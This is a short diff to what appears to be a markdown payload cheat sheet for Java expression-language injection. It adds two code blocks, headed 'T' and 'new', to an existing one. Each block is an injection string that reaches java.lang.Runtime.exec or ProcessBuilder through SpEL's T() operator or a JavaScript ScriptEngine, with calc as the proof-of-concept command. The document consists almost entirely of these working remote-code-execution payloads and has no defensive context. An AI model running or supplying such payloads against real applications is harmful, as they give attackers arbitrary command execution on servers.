@@ -47,3 +47,14 @@ processor.eval("user.name")
 ```java
 "".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")
 ```
+
+## T
+
+```java
+T(java.lang.Runtime).getRuntime().exec(\"calc\").getInputStream()
+```
+
+## new
+```
+new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")
+```
